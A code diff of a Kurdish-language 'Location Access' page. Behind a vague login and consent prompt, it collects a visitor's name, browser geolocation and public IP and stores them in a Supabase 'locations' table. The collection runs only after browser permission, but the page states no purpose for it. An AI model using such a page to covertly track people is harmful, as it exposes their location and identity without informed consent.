@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
   <title>Location Access</title>
 
   <style>
@@ -46,6 +45,7 @@
     #result {
       margin-top: 25px;
       line-height: 1.6;
+      word-break: break-word;
     }
   </style>
 </head>
@@ -53,129 +53,72 @@
 <body>
 
   <div class="box">
-
     <h2>داخڵبوون</h2>
-
     <p>بۆ بەردەوامبوون، تکایە رەزامەندیت هاوبەش بکە.</p>
 
-    <button id="allow">
-      بەردەوام بوون
-    </button>
+    <button id="allow">بەردەوام بوون</button>
+    <button id="deny">ڕەتکردنەوە</button>
 
-    <button id="deny">
-      ڕەتکردنەوە
-    </button>
-
-    <div id="result">
-      ئامادەیە...
-    </div>
-
+    <div id="result">ئامادەیە...</div>
   </div>
-
 
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
   <script>
+    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
 
-    const SUPABASE_URL =
-      "https://mxichdljcrlcomnhkcin.supabase.co";
+    // دروستکردنی Supabase Client بە شێوەیەکی ئامادەکراو
+    let supabase = null;
+    try {
+      if (window.supabase && typeof window.supabase.createClient === 'function') {
+        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+      }
+    } catch (e) {
+      console.error("Supabase Init Error:", e);
+    }
 
-    const SUPABASE_KEY =
-      "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
-
-    const supabase =
-      window.supabase.createClient(
-        SUPABASE_URL,
-        SUPABASE_KEY
-      );
-
-
-    const allowButton =
-      document.getElementById("allow");
-
-    const denyButton =
-      document.getElementById("deny");
-
-    const result =
-      document.getElementById("result");
-
+    const allowButton = document.getElementById("allow");
+    const denyButton = document.getElementById("deny");
+    const result = document.getElementById("result");
 
     allowButton.addEventListener("click", function () {
+      result.innerText = "① دوگمەکە کار کرد...";
 
-      result.innerText =
-        "① دوگمەکە کار کرد...";
-
-      const name =
-        prompt("ناوی خۆت تۆماربکە:");
+      const name = prompt("ناوی خۆت تۆماربکە:");
 
       if (!name || !name.trim()) {
-
-        result.innerText =
-          "❌ ناوت نەنووسیوە.";
-
+        result.innerText = "❌ ناوت نەنووسیوە.";
         return;
       }
 
-
-      result.innerText =
-        "② ناو وەرگیرا. ئێستا داوای Location دەکەین...";
-
+      result.innerText = "② ناو وەرگیرا. تکایە لە بڕاوسەرەکەت ڕێگەپێدان (Allow) هەڵبژێرە...";
 
       if (!navigator.geolocation) {
-
-        result.innerText =
-          "❌ Browser ـەکەت Geolocation پشتگیری ناکات.";
-
+        result.innerText = "❌ Browser ـەکەت Geolocation پشتگیری ناکات.";
         return;
       }
 
-
       navigator.geolocation.getCurrentPosition(
-
         async function(position) {
+          result.innerText = "③ Location وەرگیرا. ئێستا IP دەهێنین...";
 
-          result.innerText =
-            "③ Location وەرگیرا. ئێستا Public IP دەهێنین...";
-
-
-          const latitude =
-            position.coords.latitude;
-
-          const longitude =
-            position.coords.longitude;
-
-
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
           let publicIP = null;
 
-
           try {
-
-            const response =
-              await fetch(
-                "https://api.ipify.org?format=json"
-              );
-
-            const ipData =
-              await response.json();
-
-            publicIP =
-              ipData.ip;
-
+            const response = await fetch("https://api.ipify.org?format=json");
+            const ipData = await response.json();
+            publicIP = ipData.ip;
           } catch (error) {
-
-            console.error(error);
-
-            result.innerText =
-              "⚠️ Location وەرگیرا، بەڵام IP نەهات. هەر دەچین بۆ Supabase.";
+            console.error("IP Fetch Error:", error);
           }
 
+          result.innerText = "④ زانیارییەکان ڕەوانەی Supabase دەکرێن...";
 
-          result.innerText =
-            "④ ئێستا زانیارییەکان دەخەینە Supabase...";
-
-
-          const { error } =
-            await supabase
+          if (supabase) {
+            const { error } = await supabase
               .from("locations")
               .insert([
                 {
@@ -186,73 +129,38 @@
                 }
               ]);
 
-
-          if (error) {
-
-            console.error(error);
-
-            result.innerText =
-              "❌ Supabase Error: " +
-              error.message;
-
-            return;
+            if (error) {
+              console.error(error);
+              result.innerText = "❌ Supabase Error: " + error.message;
+              return;
+            }
           }
 
-
-          result.innerHTML =
-            "<h3>✅ تەواو بوو!</h3>" +
-            "<p>Location بە سەرکەوتوویی هەڵگیرا.</p>";
-
+          result.innerHTML = "<h3>✅ تەواو بوو!</h3><p>Location بە سەرکەوتوویی هەڵگیرا.</p>";
         },
-
-
         function(error) {
-
-          console.error(error);
-
+          console.error("Geolocation Error:", error);
           if (error.code === 1) {
-
-            result.innerText =
-              "❌ Location Permission ڕەتکرایەوە.";
-
+            result.innerHTML = "<b style='color:red;'>❌ Location Permission ڕەتکرایەوە. تکایە لە ڕێکخستنی بڕاوسەرەکە Reset بکه.</b>";
           } else if (error.code === 2) {
-
-            result.innerText =
-              "❌ Location بەردەست نییە.";
-
+            result.innerText = "❌ Location بەردەست نییە. GPS هۆڵبکە.";
           } else if (error.code === 3) {
-
-            result.innerText =
-              "❌ داواکاری Location کاتی تەواو بوو.";
-
+            result.innerText = "❌ داواکاری Location کاتی تەواو بوو (Timeout).";
           } else {
-
-            result.innerText =
-              "❌ هەڵەیەک لە Location ڕوویدا.";
-
+            result.innerText = "❌ هەڵەیەک لە Location ڕوویدا.";
           }
-
         },
-
-
         {
-          enableHighAccuracy: true,
-          timeout: 15000,
+          enableHighAccuracy: false, // خێراتر و بێ پشت بەستن بە GPSی بەهێز
+          timeout: 20000,
           maximumAge: 0
         }
-
       );
-
     });
-
 
     denyButton.addEventListener("click", function() {
-
-      result.innerText =
-        "Location ڕەتکرایەوە.";
-
+      result.innerText = "Location ڕەتکرایەوە.";
     });
-
   </script>
 
 </body>
